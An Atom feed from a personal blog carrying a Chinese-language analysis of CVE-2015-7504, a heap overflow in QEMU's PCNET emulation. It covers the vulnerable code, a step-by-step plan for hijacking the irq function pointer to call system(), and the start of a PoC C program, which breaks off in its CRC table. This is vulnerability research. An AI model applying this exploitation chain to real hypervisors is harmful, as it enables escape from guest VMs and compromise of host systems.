<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>hhdx&#39;s blog</title>
  
  
  <link href="http://hhdx.xyz/atom.xml" rel="self"/>
  
  <link href="http://hhdx.xyz/"/>
  <updated>2020-12-12T05:31:25.880Z</updated>
  <id>http://hhdx.xyz/</id>
  
  <author>
    <name>hhdx</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>QEMU堆溢出漏洞----CVE-2015-7504</title>
    <link href="http://hhdx.xyz/2020/12/12/CVE-2015-7504/"/>
    <id>http://hhdx.xyz/2020/12/12/CVE-2015-7504/</id>
    <published>2020-12-12T02:36:40.000Z</published>
    <updated>2020-12-12T05:31:25.880Z</updated>
    
    <content type="html"><![CDATA[<p>CVE-2015-7504是QEMU在仿真pcnet网卡中出现的一个堆溢出漏洞，可以溢出四个字节，可以劫持程序的执行流，结合前面的CVE-2015-5165可以实现任意代码执行。但有一个很致命的问题，宿主机内核需要使用<code>CONFIG_ARCH_BINFMT_ELF_RANDOMIZE_PIE </code>标志进行编译，否则在溢出的四个字节没法成功修改地址（总体八个字节的地址，因此需要高四字节与目标地址一致）。这个编译标志在目前最新的Ubuntu16.04中似乎已经没有了，所以就不进行完整的复现了，仅复现至PoC部分。</p><h2 id="PCNET网卡"><a href="#PCNET网卡" class="headerlink" title="PCNET网卡"></a>PCNET网卡</h2><p>AMD 的PCNET系列网卡被许多虚拟机或仿真器支持，如QEMU、VMware和VirtualBox。虽然没有RTL8139简易，但它的支持更加广泛，RTL8139只在QEMU中有支持。</p><p>网卡有16位和32位两种模式，这取决于DWIO 的值（储存在卡中变量），16位模式是网卡重置之后的默认模式。网卡有两类内部寄存器：CSR（控制和状态寄存器）和BCR（Bus Control Register）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">0                                  16</span><br><span class="line">+----------------------------------+</span><br><span class="line">|              EPROM               |</span><br><span class="line">+----------------------------------+</span><br><span class="line">|      RDP - Data reg for CSR      |</span><br><span class="line">+----------------------------------+</span><br><span class="line">| RAP - Index reg for CSR and BCR  |</span><br><span class="line">+----------------------------------+</span><br><span class="line">|           Reset reg              |</span><br><span class="line">+----------------------------------+</span><br><span class="line">|      BDP - Data reg for BCR      |</span><br><span class="line">+----------------------------------+</span><br></pre></td></tr></table></figure><a id="more"></a><p>两种寄存器都需要通过设置对应的我们要访问的RAP（寄存器地址端口）寄存器来实现对相应CSR或BCR寄存器的访问。例如，如果想要初始化或者重启网卡，得设置CSR0的bit0和bit1为1，这个操作可以通过设置RAP为0，然后设置CSR为3来实现。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">outw(<span class="number">0x0</span>, PCNET_PORT + RAP);</span><br><span class="line">outw(<span class="number">0x3</span>, PCNET_PORT + RDP);</span><br></pre></td></tr></table></figure><p>网卡的配置可以通过填充一个初始化结构体，并将该结构体的物理地址传送到网卡（通过设置CSR[1]和CSR[2]）来完成，结构体定义如下（通过查询qemu实现的PCNET的规范，发现这个<code>pcnet_config</code>对应的是32位IDAR的config）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pcnet_config</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint16_t</span>  mode;      <span class="comment">/* working mode: promiscusous, looptest, etc. */</span></span><br><span class="line">    <span class="keyword">uint8_t</span>   rlen;      <span class="comment">/* number of rx descriptors in log2 base */</span></span><br><span class="line">    <span class="keyword">uint8_t</span>   tlen;      <span class="comment">/* number of tx descriptors in log2 base */</span></span><br><span class="line">    <span class="keyword">uint8_t</span>   mac[<span class="number">6</span>];    <span class="comment">/* mac address */</span></span><br><span class="line">    <span class="keyword">uint16_t</span> _reserved;</span><br><span class="line">    <span class="keyword">uint8_t</span>   ladr[<span class="number">8</span>];   <span class="comment">/* logical address filter */</span></span><br><span class="line">    <span class="keyword">uint32_t</span>  rx_desc;   <span class="comment">/* physical address of rx descriptor buffer */</span></span><br><span class="line">    <span class="keyword">uint32_t</span>  tx_desc;   <span class="comment">/* physical address of tx descriptor buffer */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/clxsh/pics/master/img/image-20201209211827489.png" alt="image-20201209211827489"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>PCNET网卡在loopback测试模式中接收到大尺寸的数据包时，存在一个堆上的溢出漏洞。PCNET的仿真使用了4kB的缓冲区来存储数据包。如果接收描述符(Tx descriptor)存在<code>ADDFCS</code>标志，那么网卡将在数据包的尾部添加CRC校验码（见<code>pcnet_receive()</code>函数，<code>hw/net/pcnet.c</code>）。在接收小于4096-4字节的时候，不会出现任何问题，但如果这个数据包就是4096字节大小，那么将会在目标缓冲区溢出4个字节。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">pcnet_receive</span><span class="params">(NetClientState *nc, <span class="keyword">const</span> <span class="keyword">uint8_t</span> *buf, <span class="keyword">size_t</span> size_)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// .......</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!(CSR_CRST(s) &amp; <span class="number">0x8000</span>)) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> PCNET_DEBUG_RMD</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;pcnet - no buffer: RCVRC=%d\n&quot;</span>, CSR_RCVRC(s));</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">            s-&gt;csr[<span class="number">0</span>] |= <span class="number">0x1000</span>; <span class="comment">/* Set MISS flag */</span></span><br><span class="line">            CSR_MISSC(s)++;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">uint8_t</span> *src = s-&gt;buffer;</span><br><span class="line">            hwaddr crda = CSR_CRDA(s);</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">pcnet_RMD</span> <span class="title">rmd</span>;</span></span><br><span class="line">            <span class="keyword">int</span> pktcount = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!s-&gt;looptest) &#123;</span><br><span class="line">                <span class="built_in">memcpy</span>(src, buf, size);</span><br><span class="line">                <span class="comment">/* no need to compute the CRC */</span></span><br><span class="line">                src[size] = <span class="number">0</span>;</span><br><span class="line">                src[size + <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">                src[size + <span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">                src[size + <span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line">                size += <span class="number">4</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (s-&gt;looptest == PCNET_LOOPTEST_CRC ||</span><br><span class="line">                       !CSR_DXMTFCS(s) || size &lt; MIN_BUF_SIZE+<span class="number">4</span>) &#123;</span><br><span class="line">                <span class="keyword">uint32_t</span> fcs = ~<span class="number">0</span>;</span><br><span class="line">                <span class="keyword">uint8_t</span> *p = src;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">while</span> (p != &amp;src[size])</span><br><span class="line">                    CRC(fcs, *p++);</span><br><span class="line">                *(<span class="keyword">uint32_t</span> *)p = htonl(fcs);    <span class="comment">// bug here</span></span><br><span class="line">                size += <span class="number">4</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">uint32_t</span> fcs = ~<span class="number">0</span>;</span><br><span class="line">                <span class="keyword">uint8_t</span> *p = src;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">while</span> (p != &amp;src[size<span class="number">-4</span>])</span><br><span class="line">                    CRC(fcs, *p++);</span><br><span class="line">                crc_err = (*(<span class="keyword">uint32_t</span> *)p != htonl(fcs));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// .......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在上面的代码中变量<code>s</code>指向PCNET的主要结构<code>PCNetState_st</code>，从它的结构来看（见下）。溢出会修改它的<code>irq</code>成员的低4字节，通过对CRC的逆向，可以完全控制溢出的4字节的内容。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PCNetState_st</span> &#123;</span></span><br><span class="line">    NICState *nic;</span><br><span class="line">    NICConf conf;</span><br><span class="line">    QEMUTimer *poll_timer;</span><br><span class="line">    <span class="keyword">int</span> rap, isr, lnkst;</span><br><span class="line">    <span class="keyword">uint32_t</span> rdra, tdra;</span><br><span class="line">    <span class="keyword">uint8_t</span> prom[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">uint16_t</span> csr[<span class="number">128</span>];</span><br><span class="line">    <span class="keyword">uint16_t</span> bcr[<span class="number">32</span>];</span><br><span class="line">    <span class="keyword">int</span> xmit_pos;</span><br><span class="line">    <span class="keyword">uint64_t</span> timer;</span><br><span class="line">    MemoryRegion mmio;</span><br><span class="line">    <span class="keyword">uint8_t</span> buffer[<span class="number">4096</span>];  <span class="comment">// overflow here</span></span><br><span class="line">    qemu_irq irq;</span><br><span class="line">    <span class="keyword">void</span> (*phys_mem_read)(<span class="keyword">void</span> *dma_opaque, hwaddr addr,</span><br><span class="line">                          <span class="keyword">uint8_t</span> *buf, <span class="keyword">int</span> len, <span class="keyword">int</span> do_bswap);</span><br><span class="line">    <span class="keyword">void</span> (*phys_mem_write)(<span class="keyword">void</span> *dma_opaque, hwaddr addr,</span><br><span class="line">                           <span class="keyword">uint8_t</span> *buf, <span class="keyword">int</span> len, <span class="keyword">int</span> do_bswap);</span><br><span class="line">    <span class="keyword">void</span> *dma_opaque;</span><br><span class="line">    <span class="keyword">int</span> tx_busy;</span><br><span class="line">    <span class="keyword">int</span> looptest;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这个<code>irq</code>成员变量指向一个<code>IRQState</code>结构的指针，该结构又含有函数指针。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// include/hw/irq.h</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">IRQState</span> *<span class="title">qemu_irq</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*qemu_irq_handler)</span><span class="params">(<span class="keyword">void</span> *opaque, <span class="keyword">int</span> n, <span class="keyword">int</span> level)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// hw/core/irq.c</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">IRQState</span> &#123;</span></span><br><span class="line">    Object parent_obj;</span><br><span class="line">    qemu_irq_handler handler;</span><br><span class="line">    <span class="keyword">void</span> *opaque;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这个函数将会被调用多次。例如，在<code>pcnet_receive()</code>函数的末尾，将会调用<code>pcnet_update_irq()</code>，其中会继续调用<code>qemu_set_irq()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// hw/core/irq.c</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">qemu_set_irq</span><span class="params">(qemu_irq irq, <span class="keyword">int</span> level)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!irq)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    irq-&gt;handler(irq-&gt;opaque, irq-&gt;n, level);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="利用的流程"><a href="#利用的流程" class="headerlink" title="利用的流程"></a>利用的流程</h2><ul><li>构造一个<code>IRQState</code>结构，其中包含一个想要执行的函数的指针（如：<code>system()</code>）</li><li>计算构造的结构的准确地址。通过前述CVE-2015-5165泄露的基地址，可以达成这个目标。</li><li>伪造一个4kB的数据包。对CRC进行逆向，使其指向构造的<code>IRQState</code>结构</li><li>发送数据包</li></ul><p>loopback接收之后：</p><ul><li>将收的数据包拷贝到缓冲区</li><li>计算数据包的CRC，添加到末尾，也就覆盖了<code>irq</code>变量的低4字节</li><li>调用<code>pcnet_update_irq()</code>函数，触发目标函数指针。</li></ul><h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><p><a href="https://github.com/clxsh/CVE/blob/main/CVE-2015-7504/poc.c">Poc</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// page relevant</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SHIFT 12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE (1 &lt;&lt; PAGE_SHIFT)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PFN_PRESENT (1ULL &lt;&lt; 63)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_PFN ((1ULL &lt;&lt; 55) - 1)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_MASK ((1 &lt;&lt; PAGE_SHIFT) - 1)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_ALIGNED __attribute__((aligned(PAGE_SIZE)))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PCNET_PORT 0xc140</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PCNET_BUFFER_SIZE 4096</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DRX     0x0001</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DTX     0x0002</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LOOP    0x0004</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DXMTFCS 0x0008</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INTL    0x0040</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DRCVPA  0x2000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DRCVBC  0x4000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PROM    0x8000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> pcnet_register &#123;</span><br><span class="line">    RDP = <span class="number">0x10</span>,</span><br><span class="line">    RAP = <span class="number">0x12</span>,</span><br><span class="line">    RST = <span class="number">0x14</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRC(crc, ch) (crc = (crc &gt;&gt; 8) ^ crctab[(crc ^ (ch)) &amp; 0xff])</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* generated using the AUTODIN II polynomial</span></span><br><span class="line"><span class="comment"> *x^32 + x^26 + x^23 + x^22 + x^16 +</span></span><br><span class="line"><span class="comment"> *x^12 + x^11 + x^10 + x^8 + x^7 + x^5 + x^4 + x^2 + x^1 + 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">uint32_t</span> crctab[<span class="number">256</span>] = &#123;</span><br><span class="line"><span class="number">0x00000000</span>, <span class="number">0x77073096</span>, <span class="number">0xee0e612c</span>, <span class="number">0x990951ba</span>,</span><br><span class="line"><span class="number">0x076dc419</span>, <span class="number">0x706af48f</span>, <span class="number">0xe963a535</span>, <span class="number">0x9e6495a3</span>,</span><br><span class="line"><span class="number">0x0edb8832</span>, <span class="number">0x79dcb8a4</span>, <span class="number">0xe0d5e91e</span>, <span class="number">0x97d2d988</span>,</span><br><span class="line"><span class="number">0x09b64c2b</span>, <span class="number">0x7eb17cbd</span>, <span class="number">0xe7b82d07</span>, <span class="number">0x90bf1d91</span>,</span><br><span class="line"><span class="number">0x1db71064</span>, <span class="number">0x6ab020f2</span>, <span class="number">0xf3b97148</span>, <span class="number">0x84be41de</span>,</span><br><span class="line"><span class="number">0x1adad47d</span>, <span class="number">0x6ddde4eb</span>, <span class="number">0xf4d4b551</span>, <span class="number">0x83d385c7</span>,</span><br><span class="line"><span class="number">0x136c9856</span>, <span class="number">0x646ba8c0</span>, <span class="number">0xfd62f97a</span>, <span class="number">0x8a65c9ec</span>,</span><br><span class="line"><span class="number">0x14015c4f</span>, <span class="number">0x63066cd9</span>, <span class="number">0xfa0f3d63</span>, <span class="number">0x8d080df5</span>,</span><br><span class="line"><span class="number">0x3b6e20c8</span>, <span class="number">0x4c69105e</span>, <span class="number">0xd56041e4</span>, <span class="number">0xa2677172</span>,</span><br><span class="line"><span class="number">0x3c03e4d1</span>, <span class="number">0x4b04d447</span>, <span class="number">0xd20d85fd</span>, <span class="number">0xa50ab56b</span>,</span><br><span class="line"><span class="number">0x35b5a8fa</span>, <span class="number">0x42b2986c</span>, <span class="number">0xdbbbc9d6</span>, <span class="number">0xacbcf940</span>,</span><br><span class="line"><span class="number">0x32d86ce3</span>, <span class="number">0x45df5c75</span>, <span class="number">0xdcd60dcf</span>, <span class="number">0xabd13d59</span>,</span><br><span class="line"><span class="number">0x26d930ac</span>, <span class="number">0x51de003a</span>, <span class="number">0xc8d75180</span>, <span class="number">0xbfd06116</span>,</span><br><span class="line"><span class="number">0x21b4f4b5</span>, <span class="number">0x56b3c423</span>, <span class="number">0xcfba9599</span>, <span class="number">0xb8bda50f</span>,</span><br><span class="line"><span class="number">0x2802b89e</span>, <span class="number">0x5f058808</span>, <span class="number">0xc60cd9b2</span>, <span class="number">0xb10be924</span>,</span><br><span class="line"><span class="number">0x2f6f7c87</span>, <span class="number">0x58684c11</span>, <span class="number">0xc1611dab</span>, <span class="number">0xb6662d3d</span>,</span><br><span class="line"><span class="number">0x76dc4190</span>, <span class="number">0x01db7106</span>, <span class="number">0x98d220bc</span>, <span class="number">0xefd5102a</span>,</span><br><span class="line"><span class="number">0x71b18589</span>, <span class="number">0x06b6b51f</span>, <span class="number">0x9fbfe4a5</span>, <span class="number">0xe8b8d433</span>,</span><br><span class="line"><span class="number">0x7807c9a2</span>, <span class="number">0x0f00f934</span>, <span 